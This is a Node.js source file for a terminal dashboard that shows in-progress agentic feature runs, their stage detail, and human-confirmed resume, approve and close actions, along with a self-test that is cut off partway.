#!/usr/bin/env node
'use strict';

// Terminal dashboard for /feature runs: in-progress features on the left, the
// highlighted run's live stage detail on the right.
// Rendering and key handling are pure functions so they are testable without a TTY.

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const readline = require('readline');
const { spawnSync } = require('child_process');
const { PHASES, ICONS, buildSummary, demoState, pullRequestLine, completeKey, planDigestLines } = require('./progress');
const { listRuns, focusIndex, setActive, ago, runsRoot } = require('./runs-index');
const { describe: describeEngine } = require('./engine-owner');
const { projectRoot } = require('./paths');
const notify = require('./notify');
// R / T / A start the engine through the same code path as `agentic approve`.
const { startEngine, RUNS_CLI } = require('./engine-launch');

// Every dashboard icon must be an unambiguous two-column emoji: ⏭ and similar
// text-presentation symbols render one column in some terminals and two in
// others, which would drift the box borders by a character.
const DASH_ICONS = { ...ICONS, skipped: '➖' };

const ABANDON_REASON = 'closed from the dashboard before verification';

const MIN_SPLIT_WIDTH = 78;
const LIST_MIN = 18;
const LIST_MAX = 30;

// ---------------------------------------------------------------------------
// Text measurement: status icons are emoji and occupy two columns.

const WIDE_RANGES = [
  // Only symbols with Emoji_Presentation=Yes take two columns: ⏩⏰⏳ are wide,
  // while ⏭ ⏱ ⏸ default to text presentation and stay one column.
  [0x1100, 0x115f], [0x2329, 0x232a], [0x23e9, 0x23ec], [0x23f0, 0x23f0], [0x23f3, 0x23f3],
  [0x25fd, 0x25fe], [0x2614, 0x2615],
  [0x2648, 0x2653], [0x267f, 0x267f], [0x2693, 0x2693], [0x26a1, 0x26a1], [0x26aa, 0x26ab],
  [0x26bd, 0x26be], [0x26c4, 0x26c5], [0x26ce, 0x26ce], [0x26d4, 0x26d4], [0x26ea, 0x26ea],
  [0x26f2, 0x26f3], [0x26f5, 0x26f5], [0x26fa, 0x26fa], [0x26fd, 0x26fd], [0x2705, 0x2705],
  [0x270a, 0x270b], [0x2728, 0x2728], [0x274c, 0x274c], [0x274e, 0x274e], [0x2753, 0x2755],
  [0x2757, 0x2757], [0x2795, 0x2797], [0x27b0, 0x27b0], [0x27bf, 0x27bf], [0x2b1b, 0x2b1c],
  [0x2b50, 0x2b50], [0x2b55, 0x2b55], [0x2e80, 0xa4cf], [0xac00, 0xd7a3], [0xf900, 0xfaff],
  [0xfe30, 0xfe6f], [0xff00, 0xff60], [0xffe0, 0xffe6], [0x1f004, 0x1f004], [0x1f0cf, 0x1f0cf],
  [0x1f18e, 0x1f18e], [0x1f191, 0x1f19a], [0x1f200, 0x1f320], [0x1f32d, 0x1f335],
  [0x1f337, 0x1f37c], [0x1f37e, 0x1f393], [0x1f3a0, 0x1f3ca], [0x1f3cf, 0x1f3d3],
  [0x1f3e0, 0x1f3f0], [0x1f3f4, 0x1f3f4], [0x1f3f8, 0x1f43e], [0x1f440, 0x1f440],
  [0x1f442, 0x1f4fc], [0x1f4ff, 0x1f53d], [0x1f54b, 0x1f54e], [0x1f550, 0x1f567],
  [0x1f57a, 0x1f57a], [0x1f595, 0x1f596], [0x1f5a4, 0x1f5a4], [0x1f5fb, 0x1f64f],
  [0x1f680, 0x1f6c5], [0x1f6cc, 0x1f6cc], [0x1f6d0, 0x1f6d2], [0x1f6eb, 0x1f6ec],
  [0x1f6f4, 0x1f6fc], [0x1f7e0, 0x1f7eb], [0x1f90c, 0x1f93a], [0x1f93c, 0x1f945],
  [0x1f947, 0x1f9ff], [0x1fa70, 0x1faff],
];

const ANSI = /\x1b\[[0-9;]*m/g;

function charWidth(cp) {
  if (cp === 0xfe0f || cp === 0x200d) return 0;
  if (cp < 32 || (cp >= 0x7f && cp < 0xa0)) return 0;
  if (cp >= 0x300 && cp <= 0x36f) return 0;
  return WIDE_RANGES.some(([lo, hi]) => cp >= lo && cp <= hi) ? 2 : 1;
}

function width(text) {
  let total = 0;
  for (const ch of String(text).replace(ANSI, '')) total += charWidth(ch.codePointAt(0));
  return total;
}

function truncate(text, max) {
  if (max <= 0) return '';
  if (width(text) <= max) return String(text);
  let out = '';
  let used = 0;
  for (const ch of String(text).replace(ANSI, '')) {
    const w = charWidth(ch.codePointAt(0));
    if (used + w > max - 1) break;
    out += ch;
    used += w;
  }
  return `${out}…`;
}

// Untrusted text (run notes, role names, engine.pid fields, runs.js output)
// reaches the frame; only the colour codes this file paints survive. Every
// other escape sequence and control character becomes a space, so nothing can
// move the cursor, rewrite the command line or write the clipboard (OSC 52).
const UNSAFE = /\x1b\[[0-9;?]*[ -/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)?|\x1b[@-_]?|[\u0000-\u001f\u007f-\u009f]/g;
function safe(text) { return String(text == null ? '' : text).replace(UNSAFE, match => (/^\x1b\[[0-9;]*m$/.test(match) ? match : ' ')); }

function pad(text, size) {
  const value = truncate(safe(text), size);
  return value + ' '.repeat(Math.max(0, size - width(value)));
}

const COLORS = { reset: '\x1b[0m', dim: '\x1b[2m', bold: '\x1b[1m', invert: '\x1b[7m', green: '\x1b[32m', red: '\x1b[31m', yellow: '\x1b[33m', cyan: '\x1b[36m' };
// Run list markers, beside the active/finished flags.
const NEEDS_YOU = '⚠';
const RUNNING = '●';
function paint(text, codes, enabled) { return enabled && codes ? `${codes}${text}${COLORS.reset}` : String(text); }
function statusColor(status) {
  if (status === 'pass' || status === 'skipped') return COLORS.green;
  if (status === 'fail' || status === 'blocked') return COLORS.red;
  if (status === 'in_progress') return COLORS.yellow;
  return COLORS.dim;
}

// ---------------------------------------------------------------------------
// Frame

function bar(percent, size) {
  const filled = Math.max(0, Math.min(size, Math.round((percent / 100) * size)));
  return `${'█'.repeat(filled)}${'░'.repeat(size - filled)}`;
}

function listLines(runs, index, rows) {
  if (!runs.length) return ['(no runs)'];
  const start = Math.max(0, Math.min(index - Math.floor(rows / 2), runs.length - rows));
  const window = runs.slice(Math.max(0, start), Math.max(0, start) + rows);
  return window.map(run => {
    const selected = runs[index] && run.id === runs[index].id;
    const marker = selected ? '▸' : run.active ? '·' : ' ';
    const flag = run.active ? '*' : run.inProgress ? '' : '✓';
    // A running engine is not waiting on anyone, even while the state still
    // shows the block it is about to retry. The marker comes before the id, so
    // a long id is cut, never the marker.
    const live = run.engine ? RUNNING : run.inProgress && run.needsYou ? NEEDS_YOU : ' ';
    return `${marker} ${live} ${run.id}${flag ? ` ${flag}` : ''}|${String(run.percent).padStart(3)}%`;
  });
}

// Wraps text into at most `max` lines of `size` columns, the last one cut short.
function wrap(text, size, max) {
  const words = String(text || '').split(/\s+/).filter(Boolean);
  const out = [];
  let line = '';
  for (const word of words) {
    if (line && width(`${line} ${word}`) > size) { out.push(line); line = word; } else line = line ? `${line} ${word}` : word;
  }
  if (line) out.push(line);
  if (out.length <= max) return out;
  return [...out.slice(0, max - 1), truncate(out.slice(max - 1).join(' '), size)];
}

// The "needs you" banner: what stopped, why (one or two lines), at the
// approval gate the plan digest (counts, up to `planLines` of the summary, the
// file and the keys), and the exact command. Nothing approves on highlight.
function bannerLines(run, color, size = 60, planLines = 6) {
  if (!run || !run.inProgress) return [];
  if (run.engine) return [paint(`${RUNNING} engine running · ${describeEngine(run.engine)}`, COLORS.cyan, color), ''];
  const attention = run.needsYou;
  if (!attention) return [];
  const tone = attention.kind === 'waiting' ? COLORS.yellow : COLORS.red;
  const inner = Math.max(10, size - 2);
  const plan = attention.plan ? planDigestLines(attention.plan) : [];
  // Each part wraps to two lines, so a narrow pane still shows the whole command.
  return [
    ...wrap(`${NEEDS_YOU} NEEDS YOU · ${attention.headline}`, inner, 2).map((line, i) => paint(i ? `  ${line}` : line, color ? COLORS.bold + tone : '', color)),
    ...wrap(attention.reason, inner, 2).map(line => `  ${line}`),
    ...(plan.length ? [
      ...wrap(plan[0], inner, 2).map((line, i) => paint(i ? `  ${line}` : line, COLORS.bold, color)),
      ...attention.plan.summary.slice(0, planLines).map(line => `  ${truncate(`│ ${line}`, inner - 2)}`),
      ...wrap(`  Full plan: ${attention.plan.path} · P opens it · A approves`, inner, 2).map(line => `  ${line}`),
    ] : []),
    ...wrap(`→ ${attention.command}`, inner, 2).map((line, i) => paint(i ? `  ${line}` : line, COLORS.bold, color)),
    '',
  ];
}

// Phase/role detail, compacted when the terminal is short: roles go first, then
// stages that have not started.
function detailLines(run, rows, color, size = 60) {
  if (!run) return ['No feature selected.'];
  const head = [
    paint(run.id, COLORS.bold, color) + (run.title ? paint(` · ${run.title}`, COLORS.dim, color) : ''),
    `${bar(run.percent, 24)} ${String(run.percent).padStart(3)}%`,
    `${run.planApproved ? '✅ plan approved' : '🔒 plan gate: waiting for human approval'}${run.inProgress ? '' : run.abandoned ? '  · abandoned' : '  · closed'}`,
    // The number comes before the URL, so a narrow pane clips the URL, not the number.
    ...(pullRequestLine(run) ? [paint(pullRequestLine(run), run.pullRequest ? COLORS.cyan : COLORS.dim, color)] : []),
    '',
    // A short terminal keeps room for the stages: fewer summary lines.
    ...bannerLines(run, color, size, Math.max(2, Math.min(6, rows - 22))),
  ];
  const foot = [
    '',
    `Current: ${run.current}`,
    `Updated: ${ago(run.updatedAt)}`,
    ...(run.warnings || []).slice(0, 2).map(w => paint(`⚠ ${w}`, COLORS.yellow, color)),
  ];

  const ACTIVE_PHASE = new Set(['in_progress', 'fail', 'blocked']);
  const build = ({ roles = 'all', onlyTouched = false } = {}) => {
    const out = [];
    for (const phase of run.phases) {
      if (onlyTouched && phase.status === 'pending') continue;
      out.push(`${DASH_ICONS[phase.status] || '•'} ${pad(phase.label, 24)} ${paint(phase.status, statusColor(phase.status), color)}`);
      if (roles === 'none' || (roles === 'active' && !ACTIVE_PHASE.has(phase.status))) continue;
      for (const role of phase.roles) {
        out.push(`   ${DASH_ICONS[role.status] || '•'} ${pad(role.role, 20)} ${paint(role.status, statusColor(role.status), color)}${role.executor ? paint(` · ${role.executor}`, COLORS.dim, color) : ''}`);
      }
    }
    return out;
  };

  // Tightest fit that still says the most: all roles, then only the roles of the
  // stages that are running or stuck, then stages alone.
  const budget = Math.max(1, rows - head.length - foot.length);
  const variants = [
    build(),
    build({ roles: 'active' }),
    build({ roles: 'active', onlyTouched: true }),
    build({ roles: 'none' }),
    build({ roles: 'none', onlyTouched: true }),
  ];
  for (const body of variants) {
    if (body.length <= budget) return [...head, ...body, ...foot];
  }
  return [...head, ...variants[variants.length - 1].slice(0, budget), ...foot];
}

function renderFrame(view) {
  const runs = view.runs || [];
  const cols = Math.max(40, view.width || 100);
  const rows = Math.max(12, view.height || 30);
  const color = !!view.color;
  const index = Math.max(0, Math.min(view.index || 0, Math.max(0, runs.length - 1)));
  const run = runs[index] || null;
  const scope = view.all ? 'all runs' : 'in progress';
  const title = ` AGENTIC${view.label ? ` · ${view.label}` : ''} `;
  const count = ` ${runs.length} ${scope}${view.demo ? ' · demo' : ''} `;
  const inner = cols - 2;

  const lines = [];
  lines.push(`╭${title}${'─'.repeat(Math.max(0, inner - width(title) - width(count)))}${count}╮`);

  const split = cols >= MIN_SPLIT_WIDTH;
  const bodyRows = rows - 4;
  if (split) {
    const listWidth = Math.min(LIST_MAX, Math.max(LIST_MIN, Math.max(...runs.map(r => width(r.id)), 8) + 11));
    const detailWidth = cols - listWidth - 7; // │ list │ detail │
    const left = listLines(runs, index, bodyRows).map(line => {
      const [labelPart, percentPart = ''] = line.split('|');
      const selected = labelPart.startsWith('▸');
      const text = pad(labelPart, listWidth - width(percentPart) - 1) + percentPart;
      return selected ? paint(pad(text, listWidth), color ? COLORS.bold + COLORS.cyan : '', color) : text;
    });
    const right = detailLines(run, bodyRows, color, detailWidth);
    for (let i = 0; i < bodyRows; i++) {
      lines.push(`│ ${pad(left[i] || '', listWidth)} │ ${pad(right[i] || '', detailWidth)} │`);
    }
    lines.splice(1, 0, `├${'─'.repeat(listWidth + 2)}┬${'─'.repeat(detailWidth + 2)}┤`);
    lines.push(`╰${'─'.repeat(listWidth + 2)}┴${'─'.repeat(detailWidth + 2)}╯`);
  } else {
    const listRows = Math.min(runs.length || 1, Math.max(3, Math.floor(bodyRows / 3)));
    const left = listLines(runs, index, listRows).map(line => line.replace('|', '  '));
    for (const line of left) lines.push(`│ ${pad(line, inner - 2)} │`);
    lines.push(`│ ${pad('─'.repeat(inner - 2), inner - 2)} │`);
    for (const line of detailLines(run, bodyRows - listRows - 1, color, inner - 2)) lines.push(`│ ${pad(line, inner - 2)} │`);
    lines.push(`╰${'─'.repeat(inner)}╯`);
  }

  // The last lines are cut to the terminal width: a line that wraps makes the
  // frame a row taller than the terminal and scrolls the top border away.
  const fit = text => truncate(safe(text), cols - 1);
  const keys = [
    `↑↓ select · enter set active · R resume · T retry · A approve · P plan · c close · a ${view.all ? 'in-progress only' : 'all runs'} · r refresh · q quit`,
    `↑↓ · ⏎ active · R resume · T retry · A approve · P plan · c close · a ${view.all ? 'in progress' : 'all'} · r refresh · q quit`,
  ].find(text => width(text) <= cols - 1) || `R resume · T retry · A approve · P plan · c close · q quit`;
  const hint = view.confirm
    ? paint(fit(confirmPrompt(run, view.confirm)), view.confirm === 'approve' || isVerified(run) ? COLORS.yellow : COLORS.red, color)
    : view.notice
      ? paint(fit(view.notice), view.notice.startsWith('✗') ? COLORS.red : view.notice.startsWith(NEEDS_YOU) ? COLORS.yellow : COLORS.green, color)
      : paint(fit(keys), COLORS.dim, color);
  lines.push(` ${hint}`);
  if (!runs.length) lines.push(paint(` ${fit(`No ${view.all ? 'runs' : 'features in progress'}. Start one: agentic feature <run-id> --request "..."`)}`, COLORS.dim, color));
  return lines.join('\n');
}

// ---------------------------------------------------------------------------
// Closing a run

function isVerified(run) {
  return (run?.phases || []).some(phase => phase.id === 'verification' && phase.status === 'pass');
}

// Closing a verified run is the ordinary close every caller may do. Closing one
// before verification is an abandon, which runs.js allows only in admin mode —
// here that means a human pressing the key and confirming on a real terminal.
function closeCommand(run) {
  const verified = isVerified(run);
  return {
    verified,
    admin: !verified,
    args: [RUNS_CLI, 'close', run.id, ...(verified ? [] : [ABANDON_REASON])],
  };
}

// `kind` is what the prompt confirms: 'close' or 'approve'.
function confirmPrompt(run, kind = 'close') {
  if (kind === 'approve') return run ? `Approve ${run.id}? The plan in ${run.needsYou?.plan?.path || '06-plan.md'} becomes binding and the engine resumes in the background.  y = confirm · any other key = cancel` : 'Nothing to approve.';
  if (!run) return 'Nothing to close.';
  const verified = isVerified(run);
  return verified
    ? `Close ${run.id} (verified, ${run.percent}%)?  y = confirm · any other key = cancel`
    : `Close ${run.id} at ${run.percent}% — verification has not passed, so it is recorded as abandoned.  y = confirm · any other key = cancel`;
}

function closeRun(run) {
  const { args, admin, verified } = closeCommand(run);
  const result = spawnSync(process.execPath, args, {
    encoding: 'utf8',
    timeout: 20000,
    env: { ...process.env, ...(admin ? { AI_WORKFLOW_ADMIN: '1' } : {}) },
  });
  const output = `${result.stdout || ''}${result.stderr || ''}`.trim().split(/\r?\n/).filter(Boolean).pop() || '';
  const ok = !result.error && result.status === 0;
  return {
    ok,
    verified,
    message: ok
      ? `✔ ${run.id} ${verified ? 'closed' : 'abandoned'} — ${verified ? 'run complete' : 'recorded as abandoned before verification'}`
      : `✗ could not close ${run.id}: ${output || result.error?.message || 'unknown error'}`,
  };
}

// ---------------------------------------------------------------------------
// Opening the plan (P)

// Shows the highlighted run's 06-plan.md in $PAGER (default less), with the
// dashboard suspended meanwhile: `suspend` leaves the alternate screen and raw
// mode, `resume` takes them back. $PAGER is split on whitespace and spawned
// without a shell; when it cannot run, the path is shown instead.
function openPlan(run, deps = {}) {
  const { spawnSyncFn = spawnSync, env = process.env, suspend = () => {}, resume = () => {} } = deps;
  if (!run) return { ok: false, message: '✗ no run selected' };
  const file = run.needsYou?.plan?.file || (run.dir ? path.join(run.dir, '06-plan.md') : '');
  if (!file || !fs.existsSync(file)) return { ok: false, message: `✗ ${run.id}: no plan yet` };
  const [bin, ...pagerArgs] = String(env.PAGER || 'less').trim().split(/\s+/).filter(Boolean);
  suspend();
  let result;
  try { result = spawnSyncFn(bin || 'less', [...pagerArgs, file], { stdio: 'inherit', env, shell: false }); }
  finally { resume(); }
  if (!result || result.error || result.status !== 0) return { ok: false, message: `plan: ${file}` };
  return { ok: true, message: `plan: ${file}` };
}

// What the bell rings for: a run that newly needs the human (by the same key
// the engine's notification uses) or newly finished. `seen` carries the keys
// already shown; the first call only fills it, so opening the terminal does
// not ring for what was already there.
function attentionKey(run) {
  if (!run.inProgress) return null;
  if (run.needsYou && !run.engine) return run.needsYou.key;
  if (run.current === 'Done') return completeKey(run.id, run.completedAt);
  return null;
}
function newAttention(seen, runs, first = false) {
  const fresh = [];
  for (const run of runs) {
    const key = attentionKey(run);
    if (!key || seen.has(key)) continue;
    seen.add(key);
    if (first) continue;
    fresh.push({ id: run.id, key, message: run.needsYou && !run.engine ? `${NEEDS_YOU} ${run.id} needs you — ${run.needsYou.headline} → ${run.needsYou.command}` : `✔ ${run.id} complete${run.pullRequest?.url ? ` · pull request ${run.pullRequest.number != null ? `#${run.pullRequest.number} ` : ''}${run.pullRequest.url}` : ''}` });
  }
  return fresh;
}

// ---------------------------------------------------------------------------
// Input

function handleKey(view, key = {}) {
  const name = key.name || '';
  const count = view.count || 0;
  const move = delta => ({ view: { ...view, index: count ? (view.index + delta + count) % count : 0 }, action: null });
  if (key.ctrl && (name === 'c' || name === 'd')) return { view: { ...view, confirm: false }, action: 'quit' };
  // While confirming (a close or an approval), only y goes through; every
  // other key cancels. Nothing writes without this step.
  if (view.confirm) {
    return name === 'y'
      ? { view: { ...view, confirm: false }, action: `${view.confirm}-confirm` }
      : { view: { ...view, confirm: false }, action: `${view.confirm}-cancel` };
  }
  if (name === 'c') return count ? { view: { ...view, confirm: 'close' }, action: 'close-request' } : { view, action: null };
  // Shifted: R resumes, T retries then resumes, A arms the approval prompt, P
  // opens the plan. Plain r stays refresh and plain a toggles finished runs.
  if ((name === 'r' && key.shift) || key.sequence === 'R') return count ? { view, action: 'resume' } : { view, action: null };
  if ((name === 't' && key.shift) || key.sequence === 'T') return count ? { view, action: 'retry' } : { view, action: null };
  if ((name === 'a' && key.shift) || key.sequence === 'A') return count ? { view: { ...view, confirm: 'approve' }, action: 'approve-request' } : { view, action: null };
  if ((name === 'p' && key.shift) || key.sequence === 'P') return count ? { view, action: 'open-plan' } : { view, action: null };
  if (name === 'q' || name === 'escape') return { view, action: 'quit' };
  if (name === 'down' || name === 'j' || name === 'tab') return move(1);
  if (name === 'up' || name === 'k') return move(-1);
  if (name === 'home') return { view: { ...view, index: 0 }, action: null };
  if (name === 'end') return { view: { ...view, index: Math.max(0, count - 1) }, action: null };
  if (name === 'return' || name === 'enter' || name === 'space') return { view, action: 'set-active' };
  if (name === 'a') return { view: { ...view, all: !view.all, index: 0 }, action: 'reload' };
  if (name === 'r') return { view, action: 'reload' };
  return { view, action: null };
}

// ---------------------------------------------------------------------------
// Runtime

function demoRuns() {
  const base = demoState();
  const make = (id, title, overrides) => ({
    ...buildSummary(id, { ...base, ...overrides }, { demo: true }),
    title,
    inProgress: true,
    active: id === 'FEAT-002',
    dir: '',
  });
  return [
    make('FEAT-002', 'Payments retry on timeout', {}),
    make('FEAT-007', 'Offline queue for uploads', { phases: { request: { status: 'pass' }, requirements: { status: 'in_progress' } }, roles: {}, selectedRoles: {} }),
    make('FEAT-011', 'Arabic RTL layout fixes', { phases: { ...Object.fromEntries(PHASES.slice(0, 9).map(p => [p, { status: 'pass' }])), 'build-test': { status: 'fail', updatedAt: base.updatedAt, note: 'build-test/qa-execute: 2 widget tests fail in test/rtl_layout_test.dart (expected TextDirection.rtl)', repeatedFailure: 2 } }, roles: {}, selectedRoles: {} }),
  ];
}

function load(options) {
  return options.demo ? demoRuns() : listRuns({ all: options.all });
}

function run(options = {}) {
  const out = options.stdout || process.stdout;
  const interactive = !options.once && out.isTTY && process.stdin.isTTY;
  const color = options.color !== undefined ? options.color : (!!out.isTTY && !process.env.NO_COLOR);
  // ai/runs → the runtime repo; <project>/.agentic-runs → the project.
  const root = runsRoot();
  const parent = path.dirname(root);
  const label = options.label || (options.demo ? 'demo' : path.basename(path.basename(root) === 'runs' ? path.dirname(parent) : parent));

  let view = { all: !!options.all, index: 0, notice: null, confirm: false };
  let runs = load({ demo: options.demo, all: view.all });
  // The engine sends the desktop notification; this terminal only rings and highlights.
  const settings = notify.loadConfig(projectRoot());
  // A config value that was not understood is said, not dropped.
  if (settings.problems.length) view.notice = `${NEEDS_YOU} .agentic/config.yaml: ${settings.problems.join('; ')}`;
  const seen = new Set();
  newAttention(seen, runs, true);
  view.index = Math.max(0, focusIndex(runs, options.run));
  let focusedId = runs[view.index]?.id || null;

  const frame = () => renderFrame({
    runs,
    index: view.index,
    all: view.all,
    demo: options.demo,
    notice: view.notice,
    confirm: view.confirm,
    label,
    color,
    width: out.columns || 100,
    height: out.rows || 30,
  });

  if (!interactive) {
    out.write(`${frame()}\n`);
    if (!runs.length) process.exitCode = options.demo ? 0 : 0;
    return { runs, frame: frame() };
  }

  let last = '';
  const draw = () => {
    const next = frame();
    if (next === last) return;
    last = next;
    out.write(`\x1b[H\x1b[2J${next}\n`);
  };
  let flash = () => {};
  // Keep the highlight on the same feature when the list reorders under it.
  const reload = () => {
    runs = load({ demo: options.demo, all: view.all });
    const keep = runs.findIndex(r => r.id === focusedId);
    view.index = keep >= 0 ? keep : Math.max(0, Math.min(view.index, runs.length - 1));
    focusedId = runs[view.index]?.id || null;
    const fresh = newAttention(seen, runs);
    if (fresh.length) {
      if (settings.bell) out.write('\x07');
      flash(fresh[0].message + (fresh.length > 1 ? ` (+${fresh.length - 1} more)` : ''));
    }
    draw();
  };

  // The alternate screen, raw keys and the refresh timer: taken on start and
  // after the pager (P), given back for the pager and on quit.
  let timer = null;
  const enter = () => {
    out.write('\x1b[?1049h\x1b[?25l');
    readline.emitKeypressEvents(process.stdin);
    process.stdin.setRawMode(true);
    process.stdin.resume();
    timer = setInterval(reload, options.interval || 1000);
  };
  const leave = () => {
    if (timer) clearInterval(timer);
    timer = null;
    try { process.stdin.setRawMode(false); } catch {}
    process.stdin.pause();
    out.write('\x1b[?25h\x1b[?1049l');
  };
  enter();
  let noticeTimer = null;
  const cleanup = () => {
    if (noticeTimer) clearTimeout(noticeTimer);
    leave();
  };
  const quit = code => { cleanup(); process.exit(code || 0); };

  flash = message => {
    view.notice = message;
    if (noticeTimer) clearTimeout(noticeTimer);
    noticeTimer = setTimeout(() => { view.notice = null; draw(); }, 6000);
  };
  if (view.notice) flash(view.notice);

  process.stdin.on('keypress', (_str, key) => {
    const result = handleKey({ ...view, count: runs.length }, key || {});
    view = { ...view, index: result.view.index, all: result.view.all, confirm: result.view.confirm };
    focusedId = runs[view.index]?.id || focusedId;
    if (result.action === 'quit') return quit(0);
    if (result.action === 'reload') return reload();
    if (result.action === 'close-request') { view.notice = null; return draw(); }
    if (result.action === 'close-cancel') { flash('close cancelled'); return draw(); }
    // A arms the prompt only for a run at the gate; y then approves through
    // runs.js approve and resumes in the background, like R and T.
    if (result.action === 'approve-request') {
      const target = runs[view.index];
      if (!target || target.engine || target.needsYou?.stage !== 'approval') { view.confirm = false; flash(`✗ ${target ? target.id : 'nothing'}: nothing waits for approval`); }
      else view.notice = null;
      return draw();
    }
    if (result.action === 'approve-cancel') { flash('approve cancelled'); return draw(); }
    if (result.action === 'approve-confirm') {
      const target = runs[view.index];
      if (!target) flash('nothing to approve');
      else if (options.demo) flash(`demo mode: ${target.id} not approved`);
      else {
        flash(`▸ approving ${target.id}…`);
        draw();
        flash(startEngine(target, 'approve').message);
      }
      return reload();
    }
    if (result.action === 'open-plan') {
      const target = runs[view.index];
      if (!target) flash('nothing to open');
      else if (options.demo) flash('demo mode: plan not opened');
      else flash(openPlan(target, { suspend: leave, resume: () => { enter(); last = ''; } }).message);
      return draw();
    }
    if (result.action === 'resume' || result.action === 'retry') {
      const target = runs[view.index];
      if (!target) flash(`nothing to ${result.action}`);
      else if (options.demo) flash(`demo mode: ${target.id} not started`);
      else {
        // "resuming…" right away; the marker follows once the engine claims the run.
        flash(result.action === 'retry' ? `▸ retrying ${target.id}…` : `▸ resuming ${target.id}…`);
        draw();
        flash(startEngine(target, result.action).message);
      }
      return reload();
    }
    if (result.action === 'close-confirm') {
      const target = runs[view.index];
      if (!target) flash('nothing to close');
      else if (options.demo) flash(`demo mode: ${target.id} not closed`);
      else flash(closeRun(target).message);
      return reload();
    }
    if (result.action === 'set-active') {
      const target = runs[view.index];
      if (target && !options.demo) {
        try {
          setActive(target.id);
          flash(`▸ ${target.id} is now the active run (agentic resume/approve/progress use it)`);
        } catch (error) { flash(`✗ ${error.message}`); }
      } else if (target) flash(`demo mode: ${target.id} not written`);
      return reload();
    }
    draw();
  });
  out.on('resize', draw);
  process.on('SIGINT', () => quit(0));
  process.on('SIGTERM', () => quit(0));
  draw();
  return { interactive: true };
}

// ---------------------------------------------------------------------------

function selftest() {
  assert.strictEqual(width('abc'), 3);
  assert.strictEqual(width('✅'), 2, 'status icons take two columns');
  assert.strictEqual(width('⏳'), 2);
  assert.strictEqual(width('🔄'), 2);
  assert.strictEqual(width('⏭'), 1, 'text-presentation symbols stay one column');
  for (const [status, icon] of Object.entries(DASH_ICONS)) assert.strictEqual(width(icon), 2, `dashboard icon for ${status} must be two columns`);
  assert.strictEqual(width('\x1b[32mok\x1b[0m'), 2, 'ANSI codes are not printable width');
  assert.strictEqual(width(pad('✅ ok', 10)), 10, 'padding accounts for wide icons');
  assert.strictEqual(width(truncate('abcdefghij', 5)), 5);
  assert.strictEqual(truncate('abc', 10), 'abc');
  assert.strictEqual(bar(50, 10), '█████░░░░░');

  const runs = demoRuns();
  const frame = renderFrame({ runs, index: 0, width: 100, height: 30, color: false });
  const lines = frame.split('\n');
  assert(lines.some(l => l.includes('FEAT-002')), 'runs are listed');
  assert(lines.some(l => l.includes('Analysis')), 'the focused run shows stage detail');
  assert(lines.some(l => l.includes('⏎ active · R resume')), 'key hints are shown (the compact form at 100 columns)');
  assert(renderFrame({ runs, index: 0, width: 130, height: 30, color: false }).includes('enter set active'), 'the long form on a wide terminal');
  const boxed = lines.filter(l => l.startsWith('│'));
  assert(boxed.length > 5);
  for (const line of boxed) assert.strictEqual(width(line), 100, `box line must be exactly the terminal width: ${JSON.stringify(line)}`);

  // Focus follows the selected index.
  const second = renderFrame({ runs, index: 1, width: 100, height: 30, color: false });
  assert(second.includes('Offline queue for uploads'), 'detail pane follows the selection');

  // Narrow terminals stack the panes instead of splitting.
  const narrow = renderFrame({ runs, index: 0, width: 60, height: 24, color: false });
  for (const line of narrow.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 60);
  assert(narrow.includes('FEAT-002'));

  // A running stage keeps its specialist roles visible on a normal terminal.
  const normal = renderFrame({ runs, index: 0, width: 96, height: 26, color: false });
  assert(normal.includes('security'), 'roles of the running stage survive compaction');
  assert(renderFrame({ runs, index: 0, width: 96, height: 40, color: false }).includes('Final Verification'), 'a tall terminal shows every stage');

  // An opened pull request shows in the detail head, inside the frame width.
  const withPr = [{ ...runs[0], pullRequest: { provider: 'bitbucket', number: 7762, url: 'https://bitbucket.org/extra-workspace/flutter_project/pull-requests/7762', status: 'open', branch: 'ai/FEAT-002', base: 'master', draft: false } }];
  const prFrame = renderFrame({ runs: withPr, index: 0, width: 100, height: 40, color: false });
  assert(prFrame.includes('Pull request: #7762 https://bitbucket.org/'), 'the PR number and URL are shown');
  assert(prFrame.includes('Pull Request'), 'the stage is listed');
  for (const line of prFrame.split('\n').filter(l => l.startsWith('│'))) assert.strictEqual(width(line), 100, `box line keeps the frame width: ${JSON.stringify(line)}`);
  const hinted = renderFrame({ runs: [{ ...runs[0], pullRequestHint: 'agentic pr FEAT-002' }], index: 0, width: 100, height: 30, color: false });
  assert(hinted.includes('not opened — run: agentic pr FEAT-002'), 'a skipped PR says how to open it');

  // Short terminals still render inside their row budget.
  for (const height of [12, 16, 24, 40]) {
    const rendered = renderFrame({ runs, index: 0, width: 100, height, color: false });
    assert(rendered.split('\n').length <= height + 1, `frame must fit ${height} rows`);
  }
  // Many runs scroll rather than overflow.
  const many = Array.from({ length: 40 }, (_, i) => ({ ...runs[0], id: `FEAT-${String(i).padStart(3, '0')}` }));
  const scrolled = renderFrame({ runs: many, index: 39, width: 100, height: 20, color: false });
  assert(scrolled.includes('FEAT-039'), 'the selected run stays visible when the list scrolls');
  assert(!scrolled.includes('FEAT-000'), 'far-away runs scroll out of view');

  const empty = renderFrame({ runs: [], index: 0, width: 100, height: 20, color: false });
  assert(empty.includes('No features in progress'), 'empty state explains how to start a run');
  assert(renderFrame({ runs, index: 0, width: 100, height: 30, color: true }).includes('\x1b['), 'color mode emits ANSI');
  assert(!frame.includes('\x1b['), 'color can be disabled');

  // Keys
  const view = { index: 0, count: 3, all: false };
  assert.strictEqual(handleKey(view, { name: 'down' }).view.index, 1);
  assert.strictEqual(handleKey(view, { name: 'up' }).view.index, 2, 'selection wraps');
  assert.strictEqual(handleKey({ ...view, index: 2 }, { name: 'j' }).view.index, 0);
  assert.strictEqual(handleKey(view, { name: 'end' }).view.index, 2);
  assert.strictEqual(handleKey(view, { name: 'return' }).action, 'set-active');
  assert.strictEqual(handleKey(view, { name: 'q' }).action, 'quit');
  assert.strictEqual(handleKey(view, { name: 'c', ctrl: true }).action, 'quit');
  assert.strictEqual(handleKey(view, { name: 'a' }).view.all, true);
  assert.strictEqual(handleKey(view, { name: 'a' }).action, 'reload');
  assert.strictEqual(handleKey(view, { name: 'x' }).action, null);

  // Closing asks first: c arms the prompt, y closes, anything else cancels.
  const armed = handleKey(view, { name: 'c' });
  assert.strictEqual(armed.action, 'close-request');
  assert.strictEqual(armed.view.confirm, 'close');
  assert.strictEqual(handleKey(armed.view, { name: 'y' }).action, 'close-confirm');
